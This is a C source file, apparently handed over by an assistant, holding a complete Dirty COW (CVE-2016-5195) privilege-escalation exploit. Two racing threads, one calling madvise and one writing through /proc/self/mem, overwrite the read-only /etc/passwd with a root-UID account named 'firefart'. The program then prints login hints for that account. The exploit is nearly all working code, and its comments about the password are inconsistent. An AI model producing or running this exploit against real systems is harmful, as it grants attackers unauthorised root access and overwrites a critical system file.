Here's the exploit.c file content:

```c
/*
 * Dirty COW (CVE-2016-5195) Proof of Concept Exploit
 * 
 * This exploit demonstrates a race condition in the Linux kernel's memory subsystem
 * in the way the Copy-On-Write (COW) mechanism interacts with the madvise system call.
 * 
 * The vulnerability allows an attacker to write to read-only memory mappings, enabling
 * privilege escalation by modifying protected system files.
 * 
 * Race Condition Explanation:
 * - Thread 1: Repeatedly calls madvise(MADV_DONTNEED) to discard memory pages
 * - Thread 2: Repeatedly attempts to write to the memory mapping via /proc/self/mem
 * - The race occurs between the COW fault handler and the madvise discard operation
 * - If timed correctly, the write goes to the original page instead of a private copy
 * - This allows modification of read-only files mapped with MAP_PRIVATE
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <string.h>

// Target file to exploit - /etc/passwd is world-readable but root-writable only
#define TARGET_FILE "/etc/passwd"

// Malicious content: adding a root-privileged user account
// Format: username:password:UID:GID:comment:home:shell
// Password hash 'x' means shadowed, but we use empty for direct access
#define PAYLOAD "firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash\n"

// Global variables for thread coordination
void *map;           // Memory mapped address
int target_fd;       // File descriptor for target file
int mem_fd;          // File descriptor for /proc/self/mem
int stop = 0;        // Flag to stop threads
unsigned long payload_size;

/*
 * madviseThread - Repeatedly discards memory pages
 * 
 * This thread continuously calls madvise() with MADV_DONTNEED flag to tell
 * the kernel that the memory pages are no longer needed and can be discarded.
 * This creates a race window where the COW mechanism can be exploited.
 */
void *madviseThread(void *arg) {
    int i, c = 0;
    
    printf("[*] madvise thread started\n");
    
    // Continuously discard the memory mapping to create race condition
    while (!stop) {
        c += madvise(map, 100, MADV_DONTNEED);
    }
    
    printf("[*] madvise thread stopped (called %d times)\n", c);
    return NULL;
}

/*
 * writeThread - Repeatedly attempts to write malicious content
 * 
 * This thread continuously writes the payload to the memory-mapped file through
 * /proc/self/mem. Normally, writing to a MAP_PRIVATE mapping would create a
 * private copy (COW). However, the race with madvise allows the write to
 * affect the original read-only file.
 */
void *writeThread(void *arg) {
    int i, c = 0;
    
    printf("[*] write thread started\n");
    
    // Repeatedly attempt to write payload to the mapped memory
    // Using /proc/self/mem allows writing to the address space
    while (!stop) {
        // Seek to the mapped memory location in /proc/self/mem
        lseek(mem_fd, (unsigned long)map, SEEK_SET);
        
        // Write the malicious payload
        c += write(mem_fd, PAYLOAD, payload_size);
    }
    
    printf("[*] write thread stopped (wrote %d bytes)\n", c);
    return NULL;
}

int main(int argc, char *argv[]) {
    pthread_t advise_thread, write_thread;
    struct stat st;
    
    printf("====================================\n");
    printf("Dirty COW Exploit (CVE-2016-5195)\n");
    printf("====================================\n\n");
    
    printf("[*] Target file: %s\n", TARGET_FILE);
    printf("[*] Payload: %s", PAYLOAD);
    
    payload_size = strlen(PAYLOAD);
    
    // Open the target file in READ-ONLY mode
    // This demonstrates that we're exploiting a read-only file
    printf("[*] Opening target file read-only...\n");
    target_fd = open(TARGET_FILE, O_RDONLY);
    if (target_fd < 0) {
        perror("[-] Error opening target file");
        exit(1);
    }
    
    // Get file statistics
    if (fstat(target_fd, &st) < 0) {
        perror("[-] Error getting file stats");
        exit(1);
    }
    
    printf("[*] File size: %ld bytes\n", st.st_size);
    
    // Memory map the target file with MAP_PRIVATE
    // MAP_PRIVATE should create a copy-on-write mapping that doesn't affect the original file
    // However, the race condition allows us to bypass this protection
    printf("[*] Creating memory mapping (MAP_PRIVATE)...\n");
    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, target_fd, 0);
    if (map == MAP_FAILED) {
        perror("[-] Error mapping file");
        close(target_fd);
        exit(1);
    }
    
    printf("[*] Mapped at address: %p\n", map);
    
    // Open /proc/self/mem to write to our own memory space
    // This is the technique used to write to the mapped memory
    printf("[*] Opening /proc/self/mem...\n");
    mem_fd = open("/proc/self/mem", O_RDWR);
    if (mem_fd < 0) {
        perror("[-] Error opening /proc/self/mem");
        munmap(map, st.st_size);
        close(target_fd);
        exit(1);
    }
    
    // Create the madvise thread to discard pages
    printf("[*] Creating madvise thread...\n");
    if (pthread_create(&advise_thread, NULL, madviseThread, NULL) != 0) {
        perror("[-] Error creating madvise thread");
        close(mem_fd);
        munmap(map, st.st_size);
        close(target_fd);
        exit(1);
    }
    
    // Create the write thread to write malicious content
    printf("[*] Creating write thread...\n");
    if (pthread_create(&write_thread, NULL, writeThread, NULL) != 0) {
        perror("[-] Error creating write thread");
        close(mem_fd);
        munmap(map, st.st_size);
        close(target_fd);
        exit(1);
    }
    
    // Let the race condition exploit run for a few seconds
    printf("[*] Exploiting race condition...\n");
    printf("[*] This may take a few seconds...\n");
    sleep(5);
    
    // Stop the threads
    stop = 1;
    
    // Wait for both threads to complete
    printf("[*] Waiting for threads to finish...\n");
    pthread_join(advise_thread, NULL);
    pthread_join(write_thread, NULL);
    
    // Clean up
    printf("[*] Cleaning up...\n");
    close(mem_fd);
    munmap(map, st.st_size);
    close(target_fd);
    
    printf("[+] Exploit completed!\n");
    printf("[*] Check if %s has been modified\n", TARGET_FILE);
    printf("[*] If successful, you can login with: firefart (no password or 'fire')\n");
    
    return 0;
}